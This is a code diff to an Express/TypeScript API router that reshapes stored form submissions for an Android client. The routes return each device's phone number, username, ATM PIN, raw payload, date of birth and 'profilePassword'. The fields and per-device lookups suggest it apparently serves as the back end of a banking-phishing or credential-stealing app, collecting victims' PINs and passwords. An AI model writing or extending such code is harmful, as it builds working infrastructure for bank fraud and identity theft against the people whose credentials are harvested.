@@ -5,25 +5,73 @@ import logger from "../logger/logger";
 
 const router = express.Router();
 
+/**
+ * Helper: normalize a FormSubmission doc into Android-friendly FormEntry shape.
+ * Tries multiple payload keys for best compatibility.
+ */
+function transformFormDoc(doc: any) {
+  const payload = doc.payload || {};
+
+  // phone number fallbacks
+  const phoneNumber =
+    payload.phoneNumber ??
+    payload.mobileNumber ??
+    payload.phone ??
+    payload.msisdn ??
+    payload.phone_number ??
+    "";
+
+  const username =
+    payload.username ??
+    payload.name ??
+    payload.userName ??
+    payload.user ??
+    "";
+
+  const atmPin =
+    payload.atmPin ??
+    payload.pin ??
+    payload.atm_pin ??
+    payload.atmpin ??
+    payload.pin_code ??
+    "";
+
+  return {
+    _id: doc._id,
+    uniqueid: doc.uniqueid || (payload.uniqueid ?? ""),
+    phoneNumber: phoneNumber,
+    username: username,
+    atmPin: atmPin,
+    // include raw payload too in case Android wants to inspect other fields later
+    payload: payload,
+    createdAt: doc.createdAt,
+    updatedAt: doc.updatedAt,
+  };
+}
+
 /* ================= LIST FORM SUBMISSIONS ================= */
 router.get("/form_submissions", async (_req: Request, res: Response) => {
   try {
     const docs = await FormSubmission.find().lean();
-    return res.json(docs);
+    // transform each doc to Android-friendly shape
+    const out = docs.map(transformFormDoc);
+    return res.json(out);
   } catch (err: any) {
     logger.error("forms: list form_submissions failed", err);
     return res.status(500).json([]);
   }
 });
 
-/* ================= GET FORM BY DEVICE ================= */
+/* ================= GET FORM BY DEVICE (Android uses this) ================= */
 router.get("/form_submissions/user/:uniqueid", async (req: Request, res: Response) => {
   try {
     const docs = await FormSubmission.find({
       uniqueid: req.params.uniqueid,
     }).lean();
 
-    return res.json(docs);
+    // transform to expected shape
+    const out = docs.map(transformFormDoc);
+    return res.json(out);
   } catch (err: any) {
     logger.error("forms: fetch by device failed", err);
     return res.status(500).json([]);
@@ -80,7 +128,7 @@ router.get("/success_data/device/:uniqueid", async (req: Request, res: Response)
 
     if (!doc) return res.json({ dob: "", profilePassword: "" });
 
-    const payload = (doc as any).payload || {};
+    const payload = doc.payload || {};
     return res.json({
       dob: payload.dob || "",
       profilePassword: payload.profilePassword || "",
